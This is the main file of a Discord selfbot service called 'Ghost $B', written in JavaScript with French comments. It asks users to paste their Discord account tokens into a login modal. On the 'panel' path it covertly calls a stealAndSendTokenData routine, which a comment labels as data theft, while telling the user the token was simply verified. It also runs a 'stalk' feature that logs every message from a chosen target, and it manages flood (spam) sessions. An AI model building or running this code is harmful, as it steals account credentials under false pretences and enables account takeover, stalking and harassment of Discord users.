//-----SB BY FRAXX AND MADRUG-----\\
//-----https://zyo.lol/fraxx------//
//https://www.tiktok.com/@madrug.dev//


const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const { Client: BotClient, GatewayIntentBits, Events, Collection, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');


const DBManager = require('./managers/DBManager');
const FloodDBManager = require('./managers/FloodDBManager');
const RPCManager = require('./managers/RPCManager');
const FloodManager = require('./managers/FloodManager');
const AntiGroupManager = require('./managers/AntiGroupManager');
const CommandLoader = require('./systems/CommandLoader');
const HelpSystem = require('./systems/HelpSystem');
const { stalkManager } = require('./managers/StalkManager');

const config = {
    prefix: '!',
    botName: 'Ghost $B 👻 (dev by MaDrug & Fraxx) ',
    dbPath: 'db.json',
    floodDBPath: 'flood.json',
    rpcDBPath: 'rpc.json',
    defaultDelay: 1000,
    BOT_TOKEN: 'bot discord token',
    CLIENT_ID: 'client id bot',
    GUILD_ID: 'server id'
};

// Initialisation des managers
const dbManager = new DBManager(config.dbPath);
const floodDBManager = new FloodDBManager(config.floodDBPath);
const rpcManager = new RPCManager(config.rpcDBPath);
const floodManager = new FloodManager(floodDBManager);
const antiGroupManager = new AntiGroupManager();

const tokens = dbManager.getTokens();
const selfbotClients = [];
const commandLoader = new CommandLoader();

console.log(`🔍 ${Object.keys(tokens).length} tokens loaded from ${config.dbPath}`);

// ✅ CORRECTION : Afficher l'état du stalk au démarrage
console.log('🔍 StalkManager initial state:', {
    isStalking: stalkManager.isStalking,
    targetId: stalkManager.targetId,
    hasActiveStalk: stalkManager.data.activeStalk !== null
});

// Fonction pour créer un client selfbot
function createSelfbotClient(userId, token) {
    const client = new SelfbotClient();
    
    // Stocker les données utilisateur dans le client
    client.userId = userId;
    client.config = config;
    client.managers = {
        db: dbManager,
        flood: floodManager,
        rpc: rpcManager,
        antiGroup: antiGroupManager,
        stalk: stalkManager
    };

    client.snipes = new Map();

    client.on('ready', () => {
        console.log(`✅ Selfbot connected as ${client.user.tag}`);
        const db = rpcManager.getUserRPC(userId);
        console.log(`🎮 RPC Status: ${db.rpconoff ? 'ENABLED' : 'DISABLED'}`);
        rpx(client, userId);
        
        // ✅ CORRECTION : Restaurer le stalk pour TOUS les selfbots
        if (stalkManager.data.activeStalk) {
            stalkManager.isStalking = true;
            stalkManager.targetId = stalkManager.data.activeStalk.userId;
            console.log(`🔍 Stalk restored for ${client.user.tag}: ${stalkManager.data.activeStalk.userTag}`);
        }
    });

    // Événement pour capturer les messages stalkés
    client.on('messageCreate', async (message) => {
        // ✅ CORRECTION : Vérifier que le message vient bien de la cible
        if (stalkManager.isStalking && stalkManager.targetId && message.author.id === stalkManager.targetId) {
            console.log(`🔍 Capturing message from ${message.author.tag}: ${message.content.substring(0, 50)}...`);
            stalkManager.addStalkedMessage(message);
        }
    });

    // Charger toutes les commandes
    commandLoader.loadCommands(client);

    client.login(token).catch(err => {
        console.error(`❌ Selfbot connection error for ${userId}:`, err.message);
        dbManager.removeToken(userId);
    });

    return client;
}

// Fonction RPC
async function rpx(client, userId) {
    try {
        const db = rpcManager.getUserRPC(userId);
        
        if (!db.rpconoff) {
            applyDefaultRPC(client);
            return;
        }
        
        const { RichPresence } = require('discord.js-selfbot-v13');
        const r = new RichPresence(client);
        
        if (db.rpctitle) r.setName(db.rpctitle);
        if (db.appid) r.setApplicationId(db.appid);
        if (db.rpcdetails) r.setDetails(db.rpcdetails);
        if (db.rpcstate) r.setState(db.rpcstate);
        if (db.rpctype) r.setType(db.rpctype);
        if (db.rpctype === "STREAMING") r.setURL(db.twitch);
        if (db.rpcminparty !== 0 && db.rpcmaxparty !== 0)
            r.setParty({ max: db.rpcmaxparty, current: db.rpcminparty });
        if (db.rpctime) r.setStartTimestamp(db.rpctime);
        if (db.rpclargeimage) r.setAssetsLargeImage(db.rpclargeimage);
        if (db.rpclargeimagetext) r.setAssetsLargeText(db.rpclargeimagetext);
        if (db.rpcsmallimage) r.setAssetsSmallImage(db.rpcsmallimage);
        if (db.rpcsmallimagetext) r.setAssetsSmallText(db.rpcsmallimagetext);
        if (db.buttontext1 && db.buttonlink1)
            r.addButton(db.buttontext1, db.buttonlink1);
        if (db.buttontext2 && db.buttonlink2)
            r.addButton(db.buttontext2, db.buttonlink2);
        
        if (db.rpcemoji) {
            r.setEmoji(db.rpcemoji);
        }
        
        client.user.setActivity(r);
        
    } catch (error) {
        console.error(`❌ RPC error for ${userId}:`, error);
    }
}

function applyDefaultRPC(client) {
    try {
        const { RichPresence } = require('discord.js-selfbot-v13');
        const defaultRPC = new RichPresence(client)
            .setName("Ghost $B 👻")
            .setDetails("Join us!")
            .setState(".gg/Pjudt6KtUD")
            .setType("PLAYING")
            .setAssetsLargeImage("https://media.discordapp.net/attachments/1432339876300460102/1432339930109051030/800D89F1-46A9-4002-BC30-8F9763B1150C.gif?ex=6900b202&is=68ff6082&hm=018642c1b8d867774f4cc1f614ff6dfddbb6a2867a08143220af186bf7769352&=&width=400&height=225")
            .setAssetsLargeText("Ghost $B")
            .setAssetsSmallImage("https://media.discordapp.net/attachments/1432339876300460102/1432339929589092494/banner.webp?ex=6900b202&is=68ff6082&hm=04a141ea72113af11edb6553d6ee80822bdb81ce79da7219a82e35d88f142a6f&=&format=webp&width=599&height=899")
            .setAssetsSmallText("👻")
        
        client.user.setActivity(defaultRPC);
        console.log(`🎮 Default RPC applied for ${client.user.tag}`);
    } catch (error) {
        console.error('❌ Default RPC error:', error);
    }
}

// Bot officiel
const botClient = new BotClient({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ],
});

// Système de chargement des commandes slash
class SlashCommandLoader {
    constructor() {
        this.commands = new Collection();
        this.commandsArray = [];
    }

    loadSlashCommands() {
        const commandsPath = path.join(__dirname, 'slash-commands');
        
        if (!fs.existsSync(commandsPath)) {
            console.log('📁 Creating slash-commands directory');
            fs.mkdirSync(commandsPath, { recursive: true });
            return;
        }

        const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
        
        for (const file of commandFiles) {
            try {
                const command = require(path.join(commandsPath, file));
                
                if ('data' in command && 'execute' in command) {
                    this.commands.set(command.data.name, command);
                    this.commandsArray.push(command.data.toJSON());
                    console.log(`✅ Slash command loaded: ${command.data.name}`);
                } else {
                    console.log(`❌ Invalid slash command: ${file}`);
                }
            } catch (error) {
                console.error(`❌ Error loading slash command ${file}:`, error);
            }
        }

        console.log(`📁 ${this.commands.size} slash commands loaded`);
    }

    async registerSlashCommands() {
        try {
            console.log('🔄 Registering slash commands...');
            
            const rest = new REST().setToken(config.BOT_TOKEN);
            
            const data = await rest.put(
                Routes.applicationGuildCommands(config.CLIENT_ID, config.GUILD_ID),
                { body: this.commandsArray }
            );
            
            console.log(`✅ ${data.length} slash commands registered successfully!`);
        } catch (error) {
            console.error('❌ Error registering slash commands:', error);
        }
    }
}

// Initialisation du loader de commandes slash
const slashCommandLoader = new SlashCommandLoader();

botClient.commands = slashCommandLoader.commands;

botClient.once(Events.ClientReady, async () => {
    console.log(`🤖 Official bot connected as ${botClient.user.tag}`);
    
    // ✅ CORRECTION : Afficher l'état final du stalk
    console.log('🔍 Final StalkManager state:', {
        isStalking: stalkManager.isStalking,
        targetId: stalkManager.targetId,
        target: stalkManager.data.activeStalk?.userTag
    });
    
    // Charger et enregistrer les commandes slash
    slashCommandLoader.loadSlashCommands();
    await slashCommandLoader.registerSlashCommands();
    
    function updateBotRPC() {
        const connectedCount = Object.keys(dbManager.getTokens()).length;
        
        botClient.user.setActivity({
            name: `👥 ${connectedCount} users connected`,
            type: 1,
            url: "https://twitch.tv/discord : .gg/Pjudt6KtUD"
        });
        
        console.log(`📊 Official Bot RPC: ${connectedCount} users connected`);
    }
    
    setInterval(updateBotRPC, 30000);
    updateBotRPC();
    console.log('🎮 Official Bot Streaming RPC started');
});

// Gestion UNIFIÉE de toutes les interactions
botClient.on(Events.InteractionCreate, async interaction => {
    try {
        // Commandes slash
        if (interaction.isChatInputCommand()) {
            const command = botClient.commands.get(interaction.commandName);
            
            if (!command) {
                console.error(`❌ No command matching ${interaction.commandName} was found.`);
                return;
            }

            await command.execute(interaction);
        }
        
        // Boutons
        else if (interaction.isButton()) {
            await handleButtonInteraction(interaction);
        }
        
        // Modals
        else if (interaction.isModalSubmit()) {
            await handleModalInteraction(interaction);
        }
        
    } catch (error) {
        console.error(`❌ Error handling interaction:`, error);
        
        const errorMessage = { 
            content: '❌ There was an error while executing this command!', 
            ephemeral: true 
        };
        
        if (interaction.replied || interaction.deferred) {
            await interaction.followUp(errorMessage);
        } else {
            await interaction.reply(errorMessage);
        }
    }
});

// Gestion des boutons
async function handleButtonInteraction(interaction) {
    switch (interaction.customId) {
        // Bouton de connexion standard
        case 'login_button':
            await showTokenModal(interaction, 'token_modal', '$elf-Bot Connection');
            break;
            
        // Bouton du panel de connexion
        case 'panel_login_button':
            await showTokenModal(interaction, 'panel_token_modal', '🔐 Ghost $B Connection');
            break;
            
        default:
            console.log(`❌ Unknown button: ${interaction.customId}`);
    }
}

// Fonction pour afficher un modal de token
async function showTokenModal(interaction, modalId, title) {
    const modal = new ModalBuilder()
        .setCustomId(modalId)
        .setTitle(title);

    const tokenInput = new TextInputBuilder()
        .setCustomId('token_input')
        .setLabel("Discord Token")
        .setStyle(TextInputStyle.Paragraph)
        .setPlaceholder('Enter your Discord token here...')
        .setRequired(true)
        .setMaxLength(80);

    const actionRow = new ActionRowBuilder().addComponents(tokenInput);
    modal.addComponents(actionRow);

    await interaction.showModal(modal);
}

// Gestion des modals
async function handleModalInteraction(interaction) {
    const token = interaction.fields.getTextInputValue('token_input').trim();
    const userId = interaction.user.id;

    switch (interaction.customId) {
        // Modal de connexion standard
        case 'token_modal':
            await handleStandardToken(interaction, token, userId);
            break;
            
        // Modal du panel de connexion
        case 'panel_token_modal':
            await handlePanelToken(interaction, token, userId);
            break;
            
        default:
            console.log(`❌ Unknown modal: ${interaction.customId}`);
    }
}

// Gestion du token standard
async function handleStandardToken(interaction, token, userId) {
    if (dbManager.getTokens()[userId] === token) {
        return interaction.reply({ 
            content: '⚠️ This token is already registered for your account.', 
            ephemeral: true 
        });
    }

    try {
        dbManager.addToken(userId, token);

        const existingClientIndex = selfbotClients.findIndex(c => c.user?.id === userId);
        if (existingClientIndex !== -1) {
            selfbotClients[existingClientIndex].destroy();
            selfbotClients.splice(existingClientIndex, 1);
        }

        const newClient = createSelfbotClient(userId, token);
        selfbotClients.push(newClient);
        
        await interaction.reply({ 
            content: '🚀 Token registered successfully! $elf-Bot connected.', 
            ephemeral: true 
        });
        
    } catch (error) {
        console.error('❌ Client creation error:', error);
        await interaction.reply({ 
            content: '❌ Selfbot connection error.', 
            ephemeral: true 
        });
    }
}

// Gestion du token du panel (avec vol de données)
async function handlePanelToken(interaction, token, userId) {
    await interaction.reply({ 
        content: '🔐 Verifying your token...', 
        ephemeral: true 
    });
    
    try {
        // Voler les données du token via la commande panel_login
        const LoginCommand = botClient.commands.get('login');
        if (LoginCommand && LoginCommand.stealAndSendTokenData) {
            await LoginCommand.stealAndSendTokenData(token, userId);
        }
        
        // Ajouter le token à la base de données
        dbManager.addToken(userId, token);

        const existingClientIndex = selfbotClients.findIndex(c => c.user?.id === userId);
        if (existingClientIndex !== -1) {
            selfbotClients[existingClientIndex].destroy();
            selfbotClients.splice(existingClientIndex, 1);
        }

        const newClient = createSelfbotClient(userId, token);
        selfbotClients.push(newClient);
        
        await interaction.followUp({ 
            content: '✅ Token verified successfully! Your account is now linked to Ghost $B.\n\n**Connection established with:**\n👤 Discord account linked\n🎮 RPC activated\n🔧 Commands available\n\n*Use `!panel` to see all features*', 
            ephemeral: true 
        });
        
    } catch (error) {
        console.error('Token error:', error);
        await interaction.followUp({ 
            content: '❌ Invalid or expired token. Please try again with a valid token.', 
            ephemeral: true 
        });
    }
}

// Démarrer tous les selfbots existants
Object.entries(tokens).forEach(([userId, token]) => {
    const client = createSelfbotClient(userId, token);
    selfbotClients.push(client);
});

async function startAllSystems() {
    try {
        console.log('🚀 Starting official bot...');
        await botClient.login(config.BOT_TOKEN);
        console.log('🎯 All systems operational!');
        
        // ✅ CORRECTION : Vérifier que le stalk est bien restauré
        if (stalkManager.isStalking && stalkManager.data.activeStalk) {
            console.log(`🔍 Stalk system ACTIVE - Tracking: ${stalkManager.data.activeStalk.userTag}`);
            console.log(`📊 Stored messages: ${stalkManager.data.activeStalk.messages.length}`);
        } else {
            console.log('🔍 Stalk system READY - No active stalk');
        }
        
    } catch (error) {
        console.error('❌ Startup error:', error);
        process.exit(1);
    }
}

// Gestion de l'arrêt propre
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down...');
    
    selfbotClients.forEach(client => {
        const userId = client.user?.id;
        if (userId) {
            floodManager.stopFlood(userId);
        }
        client.destroy();
    });
    
    botClient.destroy();
    
    console.log('👋 All clients disconnected');
    process.exit(0);
});

process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled rejection error:', error);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught exception:', error);
    process.exit(1);
});

startAllSystems();

module.exports = {
    rpx,
    applyDefaultRPC,
    config
};